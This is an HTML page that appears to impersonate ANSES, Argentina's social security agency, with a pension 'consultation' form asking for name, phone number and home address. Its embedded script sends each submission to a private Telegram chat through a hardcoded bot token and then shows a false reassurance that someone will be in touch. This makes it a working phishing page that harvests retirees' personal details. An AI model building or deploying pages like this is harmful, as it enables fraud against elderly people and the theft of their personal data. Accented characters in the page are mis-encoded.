<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Consulta de Jubilaci√≥n - ANSES</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body class="min-h-screen flex bg-gray-100">

  <!-- Imagen lateral -->
  <div class="hidden md:block md:w-1/2 relative">
    <img src="./anses-jubilados-noviembrejpg.webp" alt="Fondo ANSES" class="w-full h-full object-cover" />
    <div class="absolute inset-0 bg-black bg-opacity-60"></div>
    <div class="absolute inset-0 flex items-center justify-center">
      <h2 class="text-white text-3xl font-bold text-center px-6 leading-snug">
        Consultas sobre Jubilaci√≥n<br>ANSES
      </h2>
    </div>
  </div>

  <!-- Formulario -->
  <div class="w-full md:w-1/2 flex items-center justify-center p-6">
    <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md">
      <h1 class="text-2xl font-bold text-center text-blue-700 mb-6">Formulario de Consulta</h1>

      <form id="consultaForm" class="space-y-4">
        <div>
          <label class="block text-sm font-medium text-gray-700">Nombre</label>
          <input type="text" name="nombre" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
        </div>
        <div>
          <label class="block text-sm font-medium text-gray-700">Apellido</label>
          <input type="text" name="apellido" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
        </div>
        <div>
          <label class="block text-sm font-medium text-gray-700">Tel√©fono</label>
          <input type="tel" name="telefono" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
        </div>
        <div>
          <label class="block text-sm font-medium text-gray-700">Direcci√≥n</label>
          <input type="text" name="direccion" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500">
        </div>
        <div>
          <label class="block text-sm font-medium text-gray-700">Motivo de la consulta</label>
          <textarea name="motivo" rows="3" required class="w-full p-2 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500"></textarea>
        </div>

        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-xl hover:bg-blue-700">
          Enviar Consulta
        </button>
      </form>
    </div>
  </div>

  <!-- SCRIPT: Telegram + SweetAlert -->
  <script>
    const TOKEN = "7738205754:AAGCrVwdl7Ls_jNb-bpBX_c6xxQv5NOYK6Y"; // ‚Üê Reemplaza con tu token del Bot de BotFather
    const CHAT_ID = "-4774402515"; // ‚Üê Reemplaza con tu chat_id

    const form = document.getElementById('consultaForm');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const datos = new FormData(form);
      const mensaje = `
üì¨ *Nueva Consulta de Jubilaci√≥n*
üë§ *Nombre:* ${datos.get('nombre')} ${datos.get('apellido')}
üìû *Tel√©fono:* ${datos.get('telefono')}
üè† *Direcci√≥n:* ${datos.get('direccion')}
üìù *Motivo:* ${datos.get('motivo')}
      `;

      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
          })
        });

        Swal.fire({
          icon: 'success',
          title: 'Gracias por su consulta',
          text: 'Pronto nos pondremos en contacto con usted.',
          confirmButtonColor: '#2563eb',
        });

        form.reset();
      } catch (error) {
        Swal.fire({
          icon: 'error',
          title: 'Error al enviar',
          text: 'No se pudo enviar la consulta. Intente nuevamente m√°s tarde.',
          confirmButtonColor: '#dc2626',
        });
      }
    });
  </script>
</body>
</html>
